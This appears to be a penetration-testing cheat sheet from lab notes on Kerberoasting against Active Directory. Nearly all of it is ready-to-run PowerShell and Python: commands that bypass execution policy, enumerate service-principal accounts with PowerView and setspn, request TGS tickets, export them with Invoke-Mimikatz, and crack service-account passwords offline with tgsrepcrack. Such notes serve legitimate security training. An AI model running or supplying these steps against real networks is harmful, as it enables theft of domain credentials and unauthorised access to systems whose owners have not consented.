

Kerberoasting is a post exploitation techniques used to obtain the password hash of AD account that has **Service Name Principle "SPN"** enabled. 

- Authenticated Domain user requests a Kerberos ticket for an SPN. 
- The retrieved Kerberos ticket is encrypted with the hash of the service account password affiliated with the APN. 
- The attacker can try to crack the password hash offline.


### Tasks

- Identify user accounts with service Principal Name (SPN) enabled.
- Request a TGS ticket for the specified SPN using Kerberos. 
- Crack the password from TGS ticket using Tgsrepcrak. 


##### Bypass Execution Policy:
```powershell
powershell -ep bypass
```
##### Import Powerview

```powershell
. .\PowerView.ps1
```


##### Identify User accounts with SPN enabled:

```powershell
Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
```

SetSPN
```powershell
setspn -T research -Q */*
```


##### Review Kerberos Tickets
```powershell
klist
```

List kerberos tickets for the current user sessions. 


Get the TGS ticket:
```powershell
Add-Type -AssemblyName System.IdentityModel
```

```powershell
New-Object System.IdentityModel.Tokens.KerberosRequestSecurityToken -ArgumentList "ops/research.SECURITY.local:1434"
```

`ops/research.SECURITY.local:1434` This can be found with the above command `setspn -T research -Q */*`.


Export The Kerberos Ticket:
```powershell
. .\Invoke-Mimikatz.ps1
```

```powershell
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

It will save the tickets in file.

Cracking the tickets
```
python.exe tgsrepcrack.py wordlist.txt 1-40student@ops.local.kirbi
```


It will show the password. 

